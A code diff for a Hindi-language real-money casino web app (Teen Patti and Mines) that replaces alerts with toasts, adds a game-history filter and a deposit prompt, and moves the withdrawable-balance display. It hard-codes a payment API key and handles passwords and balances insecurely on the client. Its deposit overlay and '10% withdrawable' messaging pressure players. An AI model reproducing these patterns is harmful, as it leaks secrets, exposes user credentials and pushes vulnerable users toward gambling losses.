           sessionWinnings: (user.sessionWinnings || 0) + winAmount, 
           minesConsecutiveWins: (user.minesConsecutiveWins || 0) + 1, 
-          gamesPlayed: (user.gamesPlayed || 0) + 1 
+          gamesPlayed: (user.gamesPlayed || 0) + 1,
+          gameHistory: history.slice(-50)
         }); 
+        showColorfulToast(`🎉 ₹${winAmount} जीते! (10% विड्रॉल योग्य)`, 'win');
         setGrid(g => g.map(box => ({ ...box, state: 'revealed' }))); 
       };
       
+      const handleDepositFromMines = () => {
+        const amt = 100;
+        setProcessingPayment(true);
+        localStorage.setItem('tp_pending_amt', amt.toString());
+        const orderId = "ORD" + Date.now() + Math.floor(Math.random() * 10000);
+        
+        ZapUPI.createOrder(
+          { 
+            zap_key: "zap48d08e50dbbec1fd49e01946a0bd9920", 
+            order_id: orderId, 
+            amount: amt.toString(), 
+            remark: "Mines Deposit | " + user.id 
+          },
+          {
+            onResponse: function(paymentUrl, orderId, data) { 
+              ZapUPI.loadPayment(paymentUrl);
+            },
+            onError: function(err) { 
+              showColorfulToast("Order Error: " + err, 'error');
+              setProcessingPayment(false);
+            }
+          }
+        );
+      };
+
       return (
         <div className="app-wrapper bg-slate-900 text-white p-4 flex flex-col">
+          {showDepositOverlay && (
+            <div className="deposit-overlay">
+              <div className="text-center max-w-sm w-full">
+                <div className="text-6xl mb-4">💰</div>
+                <h2 className="text-2xl font-bold text-yellow-400 mb-2">बैलेंस ₹{user.balance} हो गया!</h2>
+                <p className="text-gray-300 text-sm mb-4">
+                  आपका बैलेंस ₹100 से कम हो गया है। कृपया खेलना जारी रखने के लिए डिपॉजिट करें।
+                </p>
+                <button 
+                  onClick={handleDepositFromMines}
+                  disabled={processingPayment}
+                  className="w-full py-3 rounded-xl font-bold text-lg btn-deposit flex justify-center items-center gap-2 disabled:opacity-50"
+                >
+                  {processingPayment ? (
+                    <React.Fragment>
+                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                      प्रोसेसिंग...
+                    </React.Fragment>
+                  ) : (
+                    '💰 ₹100 डिपॉजिट करें'
+                  )}
+                </button>
+                <button 
+                  onClick={() => {
+                    setShowDepositOverlay(false);
+                    onExit();
+                  }}
+                  className="mt-4 text-gray-400 text-sm underline hover:text-white transition-colors"
+                >
+                  🚪 बाहर जाएं
+                </button>
+              </div>
+            </div>
+          )}
+          
           <div className="flex justify-between items-center mb-6"><button onClick={onExit} className="mr-4 text-yellow-400 text-2xl">←</button><h2 className="text-xl font-bold text-yellow-400">Mines (25 डब्बे)</h2><div className="font-bold text-green-400 text-sm">₹{user.balance}</div></div>
           <div className="bg-slate-800 p-6 rounded-2xl mb-6 text-center border border-white/10 shadow-xl"><div className="text-sm text-gray-400">वर्तमान मल्टीप्लायर</div><div className="text-5xl font-bold text-yellow-400 mt-2 mb-2 drop-shadow-lg">{currentMultiplier.toFixed(2)}x</div><div className="text-[12px] text-gray-500 mt-2 bg-slate-900 py-1.5 rounded-lg">{message}</div></div>
           <div className="grid grid-cols-4 gap-2 mb-6">{[10, 20, 50, 100].map(amt => (<button key={amt} onClick={() => setBetAmount(amt)} disabled={isPlaying} className={`py-3 rounded-xl text-sm border font-bold transition-transform ${betAmount === amt ? 'bg-yellow-500 text-slate-900 border-yellow-400 scale-105 shadow-lg' : 'bg-slate-800 border-white/10 text-white active:scale-95'}`}>₹{amt}</button>))}</div>
@@ -1319,7 +1551,7 @@
 
       const handleAuth = async () => {
         if (isLogin) {
-          if (!mobile || !pass) return alert("मोबाइल और पासवर्ड दर्ज करें");
+          if (!mobile || !pass) return showColorfulToast("मोबाइल और पासवर्ड दर्ज करें", 'warning');
           const users = getUsers();
           let foundUser = Object.values(users).find(u => u.mobile === mobile && u.password === pass);
           
@@ -1332,13 +1564,13 @@
           }
           
           if (foundUser) { 
-            if (foundUser.isBlocked) return alert("आपका अकाउंट ब्लॉक है। कृपया एडमिन से संपर्क करें।");
+            if (foundUser.isBlocked) return showColorfulToast("आपका अकाउंट ब्लॉक है। कृपया एडमिन से संपर्क करें।", 'error');
             localStorage.setItem('tp_logged_in', JSON.stringify(foundUser)); onSignup(foundUser); 
           }
-          else { alert("गलत मोबाइल या पासवर्ड"); }
+          else { showColorfulToast("गलत मोबाइल या पासवर्ड", 'error'); }
         } else {
-          if (!name || !mobile || !pass) return alert("सभी फील्ड भरें");
-          if (mobile.length !== 10) return alert("मोबाइल नंबर 10 अंकों का होना चाहिए");
+          if (!name || !mobile || !pass) return showColorfulToast("सभी फील्ड भरें", 'warning');
+          if (mobile.length !== 10) return showColorfulToast("मोबाइल नंबर 10 अंकों का होना चाहिए", 'warning');
           
           const localUsers = getUsers();
           
@@ -1347,13 +1579,13 @@
               const snap = await window.db.ref('tp_users').once('value');
               const allDbUsers = snap.val() || {};
               if (Object.values(allDbUsers).find(u => u.mobile === mobile)) {
-                return alert("यह मोबाइल नंबर पहले से रजिस्टर्ड है");
+                return showColorfulToast("यह मोबाइल नंबर पहले से रजिस्टर्ड है", 'error');
               }
             } catch(e) {
-              if (Object.values(localUsers).find(u => u.mobile === mobile)) return alert("यह मोबाइल नंबर पहले से रजिस्टर्ड है");
+              if (Object.values(localUsers).find(u => u.mobile === mobile)) return showColorfulToast("यह मोबाइल नंबर पहले से रजिस्टर्ड है", 'error');
             }
           } else {
-            if (Object.values(localUsers).find(u => u.mobile === mobile)) return alert("यह मोबाइल नंबर पहले से रजिस्टर्ड है");
+            if (Object.values(localUsers).find(u => u.mobile === mobile)) return showColorfulToast("यह मोबाइल नंबर पहले से रजिस्टर्ड है", 'error');
           }
           
           const newId = genId();
@@ -1385,9 +1617,9 @@
             }
             
             if (!referrerFound) {
-              return alert("अमान्य रेफरल कोड। कृपया सही कोड दर्ज करें।");
+              return showColorfulToast("अमान्य रेफरल कोड। कृपया सही कोड दर्ज करें।", 'error');
             }
-            alert("रेफरल कोड लागू हुआ! पहले ₹100 डिपॉजिट करें तभी रेफरर को बोनस मिलेगा।");
+            showColorfulToast("रेफरल कोड लागू हुआ! पहले ₹100 डिपॉजिट करें तभी रेफरर को बोनस मिलेगा।", 'success');
           }
           
           const newUser = { 
@@ -1420,7 +1652,8 @@
             referralEarnings: 0, 
             isOnline: false, 
             isPlaying: false,
-            isProVersion: false
+            isProVersion: false,
+            isDepositBonus: false
           };
           
           saveUserToDB(newId, newUser); 
@@ -1522,7 +1755,6 @@
             <div>
               <div className="text-xs font-medium opacity-80">कुल बैलेंस</div>
               <div className="text-3xl font-extrabold">₹ {user.balance.toLocaleString('en-IN')}</div>
-              <div className="text-[10px] font-bold text-green-900 mt-1">विड्रॉल बैलेंस: ₹{(user.withdrawableBalance || 0).toLocaleString('en-IN')}</div>
               {user.isProVersion && (
                 <div className="text-[10px] font-bold text-blue-700 mt-1">⭐ प्रो वर्जन</div>
               )}
@@ -1570,9 +1802,9 @@
       const gamesPlayed = user.gamesPlayed || 0;
       const canWithdraw = totalDeposits >= 100 && gamesPlayed > 0;
 
-      const showToast = (msg) => { setToast({ msg }); setTimeout(() => setToast(null), 2500); };
+      const showToastLocal = (msg) => { setToast({ msg }); setTimeout(() => setToast(null), 2500); };
 
-      // ===== ZapUPI Payment Callbacks (RESTORED) =====
+      // ===== ZapUPI Payment Callbacks =====
       useEffect(() => {
         ZapUPI.setPaymentCallbacks({
           onSuccess: function(orderId) {
@@ -1588,7 +1820,7 @@
                 orderId: orderId
               }];
               
-              let updates = { balance: newBalance, withdrawableBalance: newWd, depositHistory: newHistory.slice(-20) };
+              let updates = { balance: newBalance, withdrawableBalance: newWd, depositHistory: newHistory.slice(-20), isDepositBonus: amt >= 100 };
 
               if (amt >= 100 && user.isBonusUser) {
                 updates.isProVersion = true;
@@ -1650,26 +1882,26 @@
               }
               
               onUpdate(updates);
-              showToast(`₹${amt} सफलतापूर्वक जमा हुए!`);
+              showColorfulToast(`₹${amt} सफलतापूर्वक जमा हुए! 🎉`, 'success');
               setAmount('');
               setProcessingPayment(false);
               localStorage.removeItem('tp_pending_amt');
             }
           },
           onFailed: function(orderId) { 
-            showToast("Payment Failed. Order: " + orderId); 
+            showColorfulToast("Payment Failed. Order: " + orderId, 'error');
             setProcessingPayment(false); 
           },
           onTimeout: function(orderId) { 
-            showToast("Payment Timed Out. Order: " + orderId); 
+            showColorfulToast("Payment Timed Out. Order: " + orderId, 'warning');
             setProcessingPayment(false); 
           }
         });
-      }, [user, onUpdate, showToast]);
+      }, [user, onUpdate]);
 
       const handleDeposit = () => {
         const amt = parseInt(amount);
-        if (!amt || amt <= 0) return alert('कृपया एक राशि चुनें');
+        if (!amt || amt <= 0) return showColorfulToast('कृपया एक राशि चुनें', 'warning');
         
         setProcessingPayment(true);
         localStorage.setItem('tp_pending_amt', amt.toString());
@@ -1687,30 +1919,30 @@
               ZapUPI.loadPayment(paymentUrl);
             },
             onError: function(err) { 
-              showToast("Order Error: " + err); 
+              showColorfulToast("Order Error: " + err, 'error');
               setProcessingPayment(false); 
             }
           }
         );
       };
 
-      const handleSaveBank = () => { if (!bankDetails.bankName || !bankDetails.accName || !bankDetails.accNumber || !bankDetails.ifsc) return alert("कृपया सभी बैंक विवरण भरें"); onUpdate({ bankDetails }); showToast("बैंक डिटेल्स अपडेट हो गई!"); };
+      const handleSaveBank = () => { if (!bankDetails.bankName || !bankDetails.accName || !bankDetails.accNumber || !bankDetails.ifsc) return showColorfulToast("कृपया सभी बैंक विवरण भरें", 'warning'); onUpdate({ bankDetails }); showColorfulToast("बैंक डिटेल्स अपडेट हो गई!", 'success'); };
       const handleWithdraw = () => { 
-        if (!canWithdraw) return alert("विड्रॉल के लिए पहले कम से कम ₹100 का डिपॉजिट करें और कम से कम 1 गेम खेलें!"); 
-        if (user.isBlocked) return alert("आपका अकाउंट ब्लॉक है, विड्रॉल नहीं हो सकता।"); 
+        if (!canWithdraw) return showColorfulToast("विड्रॉल के लिए पहले कम से कम ₹100 का डिपॉजिट करें और कम से कम 1 गेम खेलें!", 'warning'); 
+        if (user.isBlocked) return showColorfulToast("आपका अकाउंट ब्लॉक है, विड्रॉल नहीं हो सकता।", 'error'); 
         const amt = parseInt(amount); 
-        if (!amt || amt <= 0) return alert('वैध राशि दर्ज करें'); 
-        if (amt < config.minWithdraw) return alert(`न्यूनतम विड्रॉल लिमिट ₹${config.minWithdraw} है।`); 
+        if (!amt || amt <= 0) return showColorfulToast('वैध राशि दर्ज करें', 'warning'); 
+        if (amt < config.minWithdraw) return showColorfulToast(`न्यूनतम विड्रॉल लिमिट ₹${config.minWithdraw} है।`, 'warning'); 
         let maxWd = Math.min(user.withdrawableBalance || 0, user.balance || 0); 
-        if (amt > maxWd) return alert(`पर्याप्त विड्रॉल बैलेंस नहीं है। आप केवल ₹${maxWd} ही विड्रॉल कर सकते हैं।`); 
+        if (amt > maxWd) return showColorfulToast(`पर्याप्त विड्रॉल बैलेंस नहीं है। आप केवल ₹${maxWd} ही विड्रॉल कर सकते हैं।`, 'error'); 
         const newTx = { txId: Date.now(), amount: amt, time: new Date().toLocaleString(), ts: Date.now(), status: "Pending" }; 
         const newHistory = [...(Array.isArray(user.withdrawHistory) ? user.withdrawHistory : []), newTx]; 
         let newBalance = user.balance - amt; let newWd = (user.withdrawableBalance || 0) - amt; if (newWd < 0) newWd = 0; 
         onUpdate({ balance: newBalance, withdrawableBalance: newWd, withdrawHistory: newHistory.slice(-20) }); 
-        showToast(`₹${amt} का विड्रॉल अनुरोध सफल!`); 
+        showColorfulToast(`₹${amt} का विड्रॉल अनुरोध सफल! ✅`, 'success'); 
         setAmount(''); 
       };
-      const handleApplyPromo = () => { const code = promoInput.toUpperCase(); const promo = (config.promoCodes || []).find(p => p.code === code && p.isActive); if (!promo) return alert("अमान्य या समाप्त प्रोमो कोड।"); if (user.usedPromos?.includes(code)) return alert("आपने इस प्रोमो कोड का उपयोग पहले कर लिया है।"); const promoAmount = parseInt(promo.amount) || 0; const newBalance = user.balance + promoAmount; const newUsedPromos = [...(Array.isArray(user.usedPromos) ? user.usedPromos : []), code]; const newDepoHistory = [...(Array.isArray(user.depositHistory) ? user.depositHistory : []), { amount: promoAmount, time: new Date().toLocaleString(), desc: 'Promo Code' }]; onUpdate({ balance: newBalance, usedPromos: newUsedPromos, depositHistory: newDepoHistory.slice(-20) }); showToast(`₹${promoAmount} सफलतापूर्वक आपके अकाउंट में जोड़ दए गए हैं!`); setPromoInput(''); };
+      const handleApplyPromo = () => { const code = promoInput.toUpperCase(); const promo = (config.promoCodes || []).find(p => p.code === code && p.isActive); if (!promo) return showColorfulToast("अमान्य या समाप्त प्रोमो कोड।", 'error'); if (user.usedPromos?.includes(code)) return showColorfulToast("आपने इस प्रोमो कोड का उपयोग पहले कर लिया है।", 'warning'); const promoAmount = parseInt(promo.amount) || 0; const newBalance = user.balance + promoAmount; const newUsedPromos = [...(Array.isArray(user.usedPromos) ? user.usedPromos : []), code]; const newDepoHistory = [...(Array.isArray(user.depositHistory) ? user.depositHistory : []), { amount: promoAmount, time: new Date().toLocaleString(), desc: 'Promo Code' }]; onUpdate({ balance: newBalance, usedPromos: newUsedPromos, depositHistory: newDepoHistory.slice(-20) }); showColorfulToast(`₹${promoAmount} सफलतापूर्वक आपके अकाउंट में जोड़ दए गए हैं! 🎉`, 'success'); setPromoInput(''); };
       
       return (
         <div className="app-wrapper bg-slate-900 text-white p-4 flex flex-col">
@@ -1720,7 +1952,6 @@
           <div className="bg-slate-800 p-6 rounded-2xl mb-6 text-center border border-white/10 shadow-xl">
             <div className="text-gray-400 text-sm">कुल बैलेंस</div>
             <div className="text-4xl font-bold text-green-500 mt-2">₹ {user.balance.toLocaleString('en-IN')}</div>
-            <div className="text-yellow-400 text-sm font-bold mt-2">विड्रॉल बैलेंस: ₹{Math.min((user.withdrawableBalance || 0), (user.balance || 0)).toLocaleString('en-IN')}</div>
             {user.isProVersion && (
               <div className="text-blue-400 text-sm font-bold mt-1">⭐ प्रो वर्जन</div>
             )}
@@ -1747,17 +1978,17 @@
             </React.Fragment>
           ) : (
             <React.Fragment>
+              <div className="bg-slate-800 p-3 rounded-xl mb-4 text-center border border-yellow-500/30">
+                <div className="text-xs text-gray-400">विड्रॉल बैलेंस</div>
+                <div className="text-2xl font-bold text-yellow-400">₹{Math.min((user.withdrawableBalance || 0), (user.balance || 0)).toLocaleString('en-IN')}</div>
+              </div>
+              
               {!canWithdraw && (
                 <div className="bg-red-900/40 border border-red-500/50 text-red-400 p-3 rounded-lg mb-4 text-center font-bold text-sm">
                   ⚠️ विड्रॉल के लिए पहले कम से कम ₹100 का डिपॉजिट करें और कम से कम 1 गेम खेलें। <br/>(आपका कुल असली डिपॉजिट: ₹{totalDeposits}, गेम खेले: {gamesPlayed})
                 </div>
               )}
               {user.isBlocked && <div className="bg-red-900/50 text-red-400 p-3 rounded-lg mb-4 text-center font-bold">आपका अकाउंट ब्लॉक है। विड्रॉल करने के लिए एडमिन से संपर्क करें।</div>}
-              
-              <div className="bg-slate-800 p-3 rounded-xl mb-4 text-center border border-yellow-500/30">
-                <div className="text-xs text-gray-400">विड्रॉल बैलेंस</div>
-                <div className="text-2xl font-bold text-yellow-400">₹{Math.min((user.withdrawableBalance || 0), (user.balance || 0)).toLocaleString('en-IN')}</div>
-              </div>
               
               <div className="text-xs text-gray-400 mb-2 text-center">न्यूनतम विड्रॉल लिमिट: ₹{config.minWithdraw}</div>
               <div className="space-y-3 mb-4 bg-slate-800 p-4 rounded-xl border border-white/10">
@@ -1835,13 +2066,13 @@
                     allUsers[updatedU.id] = updatedU;
                     localStorage.setItem('tp_users', JSON.stringify(allUsers));
                     setUser(updatedU);
-                    if (updatedU.isBlocked && !u.isBlocked) { alert("आपका अकाउंट ब्लॉक कर दिया गया है। कृपया एडमिन से संपर्क करें।"); }
+                    if (updatedU.isBlocked && !u.isBlocked) { showColorfulToast("आपका अकाउंट ब्लॉक कर दिया गया है। कृपया एडमिन से संपर्क करें।", 'error'); }
                   }
                 } else if (updatedU === null) {
                   localStorage.removeItem('tp_logged_in');
                   setUser(null);
                   setScreen('login');
-                  alert("आपका अकाउंट हटा दिया गया है। कृपया दोबारा लॉगिन करें।");
+                  showColorfulToast("आपका अकाउंट हटा दिया गया है। कृपया दोबारा लॉगिन करें।", 'error');
                 }
               });
             }
@@ -1943,7 +2174,7 @@
     function ProfileScreen({ user, onBack, onUpdate, onLogout }) { 
       const [name, setName] = useState(user.name); const [avatar, setAvatar] = useState(user.avatar); const [pass, setPass] = useState(user.password); 
       const avatars = ['🧑', '👩', '🧔', '👴', '👵', '👨‍🦱', '👩‍🦰']; 
-      const handleSave = () => { onUpdate({ name, avatar, password: pass }); alert('प्रोफाइल अपडेट हो गई!'); }; 
+      const handleSave = () => { onUpdate({ name, avatar, password: pass }); showColorfulToast('प्रोफाइल अपडेट हो गई! ✅', 'success'); }; 
       return ( 
         <div className="app-wrapper bg-slate-900 text-white p-4 flex flex-col">
           <div className="flex items-center mb-6"><button onClick={onBack} className="mr-4 text-yellow-400 text-2xl">←</button><h2 className="text-xl font-bold">प्रोफाइल एडिट करें</h2></div>
@@ -1964,7 +2195,47 @@
     }
     
     // ============= GameHistoryScreen =============
-    function GameHistoryScreen({ user, onBack }) { return ( <div className="app-wrapper bg-slate-900 text-white p-4 flex flex-col"><div className="flex items-center mb-6"><button onClick={onBack} className="mr-4 text-yellow-400 text-2xl">←</button><h2 className="text-xl font-bold">गेम हिस्ट्री</h2></div><div className="bg-slate-800 p-4 rounded-xl border border-white/5 flex-grow"><div className="space-y-2 max-h-[70vh] overflow-y-auto no-scrollbar">{(user.gameHistory || []).slice().reverse().map((g, i) => (<div key={i} className="bg-slate-900 p-3 rounded-lg flex justify-between items-center text-sm border border-white/5"><div><div className="font-bold">{g.result}</div><div className="text-[10px] text-gray-500">{g.time}</div></div><div className={`font-bold ${g.result === 'Loss' ? 'text-red-500' : 'text-green-500'}`}>{g.result === 'Loss' ? '-' : '+'} ₹{g.amount}</div></div>))}{(!user.gameHistory || user.gameHistory.length === 0) && <div className="text-gray-500 text-sm text-center py-4">अभी तक कोई गेम नहीं खेला</div>}</div></div></div> ); }
+    function GameHistoryScreen({ user, onBack }) { 
+      const [filter, setFilter] = useState('all');
+      
+      const filteredHistory = (user.gameHistory || []).filter(g => {
+        if (filter === 'teenpatti') return g.type === 'teenpatti';
+        if (filter === 'mines') return g.type === 'mines';
+        return true;
+      });
+      
+      return ( 
+        <div className="app-wrapper bg-slate-900 text-white p-4 flex flex-col">
+          <div className="flex items-center mb-6"><button onClick={onBack} className="mr-4 text-yellow-400 text-2xl">←</button><h2 className="text-xl font-bold">गेम हिस्ट्री</h2></div>
+          
+          <div className="flex gap-2 mb-4 bg-slate-800 p-1 rounded-xl">
+            <button onClick={() => setFilter('all')} className={`flex-1 py-2 rounded-lg text-sm font-bold ${filter === 'all' ? 'bg-yellow-500 text-black' : 'text-gray-400'}`}>सभी</button>
+            <button onClick={() => setFilter('teenpatti')} className={`flex-1 py-2 rounded-lg text-sm font-bold ${filter === 'teenpatti' ? 'bg-green-600 text-white' : 'text-gray-400'}`}>🃏 तीन पत्ती</button>
+            <button onClick={() => setFilter('mines')} className={`flex-1 py-2 rounded-lg text-sm font-bold ${filter === 'mines' ? 'bg-purple-600 text-white' : 'text-gray-400'}`}>💣 Mines</button>
+          </div>
+          
+          <div className="bg-slate-800 p-4 rounded-xl border border-white/5 flex-grow">
+            <div className="space-y-2 max-h-[65vh] overflow-y-auto no-scrollbar">
+              {filteredHistory.slice().reverse().map((g, i) => (
+                <div key={i} className="bg-slate-900 p-3 rounded-lg flex justify-between items-center text-sm border border-white/5">
+                  <div>
+                    <div className="font-bold">{g.result}</div>
+                    <div className="text-[10px] text-gray-500">{g.time}</div>
+                    <div className="text-[8px] text-gray-600 mt-1">{g.type === 'teenpatti' ? '🃏 तीन पत्ती' : '💣 Mines'}</div>
+                  </div>
+                  <div className={`font-bold ${g.result === 'Loss' ? 'text-red-500' : 'text-green-500'}`}>
+                    {g.result === 'Loss' ? '-' : '+'} ₹{g.amount}
+                  </div>
+                </div>
+              ))}
+              {filteredHistory.length === 0 && (
+                <div className="text-gray-500 text-sm text-center py-4">कोई गेम हिस्ट्री नहीं मिली</div>
+              )}
+            </div>
+          </div>
+        </div> 
+      ); 
+    }
     
     // ============= ReferralScreen =============
     function ReferralScreen({ user, onBack }) { 
@@ -1988,7 +2259,7 @@
       const referralLink = `${window.location.origin}${window.location.pathname}?ref=${user.referralCode}`; 
       const copyToClipboard = () => { 
         navigator.clipboard.writeText(referralLink); 
-        alert('रेफरल लिंक कॉपी हो गया!'); 
+        showColorfulToast('रेफरल लिंक कॉपी हो गया! 📋', 'success'); 
       }; 
       
       const shareText = `🃏 रॉयल कैसीनो में मेरे साथ खेलें और बोनस पाएं! 🎁\nयहाँ क्लिक करें: ${referralLink}`;
